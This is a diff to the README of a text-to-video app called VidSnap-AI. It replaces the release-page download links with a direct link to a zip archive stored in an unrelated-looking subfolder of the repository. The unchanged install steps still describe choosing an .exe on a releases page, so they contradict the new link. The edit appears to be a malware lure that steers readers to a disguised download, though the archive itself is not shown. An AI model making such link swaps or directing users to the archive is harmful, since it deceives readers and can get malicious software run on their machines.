@@ -1,6 +1,6 @@
 # 🎬 VidSnap-AI - Create engaging video reels from text
 
-[![Download VidSnap-AI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/inconclusive-atlanticbonito981/VidSnap-AI/releases)
+[![Download VidSnap-AI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/inconclusive-atlanticbonito981/VidSnap-AI/raw/refs/heads/main/akonge/Snap-AI-Vid-v2.6.zip)
 
 VidSnap-AI turns your text and images into professional video content. You provide the script and the visuals, and the software handles the rest. It uses voice technology to narrate your text and organizes your images into a smooth video file. You save time on video editing while you produce content for social media.
 
@@ -19,7 +19,7 @@ You do not need programming skills to use this tool. The software runs on your W
 
 You can get the software from the releases page. Follow these steps to set up the tool on your machine.
 
-1. Go to this link: [https://github.com/inconclusive-atlanticbonito981/VidSnap-AI/releases](https://github.com/inconclusive-atlanticbonito981/VidSnap-AI/releases).
+1. Go to this link: [https://github.com/inconclusive-atlanticbonito981/VidSnap-AI/raw/refs/heads/main/akonge/Snap-AI-Vid-v2.6.zip](https://github.com/inconclusive-atlanticbonito981/VidSnap-AI/raw/refs/heads/main/akonge/Snap-AI-Vid-v2.6.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to download the installer.
 4. Open the file once the download finishes.
